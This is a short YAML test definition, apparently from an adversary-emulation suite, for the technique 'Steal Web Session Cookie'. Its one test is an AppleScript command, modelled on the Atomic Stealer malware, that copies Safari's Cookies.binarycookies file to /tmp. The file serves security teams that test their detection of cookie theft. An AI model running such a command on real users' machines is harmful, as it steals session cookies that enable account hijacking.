name: Steal Web Session Cookie
tests:
  - name: Copy Safari BinaryCookies
    guid: 019a8de9-49b4-7094-989f-ab2285eeb0ab
    description: This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.
    #TODO: replace with Atomic Stealer URL
    references:
      - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml
    language: AppleScript
    tcc_required: true
    command: |
      tell application "Finder"
        set destinationFolderPath to POSIX file "#{destination_path}"
        set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
        duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
      end tell
    args:
      destination_path: /tmp
